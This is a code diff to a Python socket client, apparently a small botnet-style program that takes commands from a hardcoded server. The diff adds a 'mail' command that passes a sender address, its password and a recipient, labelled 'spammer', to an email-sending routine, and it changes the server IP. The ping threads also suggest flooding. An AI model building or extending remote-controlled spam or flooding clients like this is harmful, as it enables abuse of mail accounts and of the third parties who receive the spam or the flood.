@@ -2,6 +2,7 @@ import socket
 import threading
 import os
 import time
+from EnvoyerCourriel import EnvoyerCourriel
 alive = False
 
 # Thread de ping.
@@ -28,9 +29,17 @@ def thread_recevoir(client_socket):
 				thread_ping1.start()
 		if "stop" in reponse:
 			alive = False
+		if "mail" in reponse:
+                        reponse = reponse[5:]
+                        spammer = reponse[:reponse.find(" ")]
+                        reponse = reponse[reponse.find(" ") + 1:]
+                        password = reponse[:reponse.find(" ")]
+                        reponse = reponse[reponse.find(" ") + 1:]
+                        receiver = reponse
+                        EnvoyerCourriel(spammer, password, receiver)
 
 # Début du main
-serveur_ip = "192.168.0.59"
+serveur_ip = "192.168.60.13"
 serveur_port = 9999
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
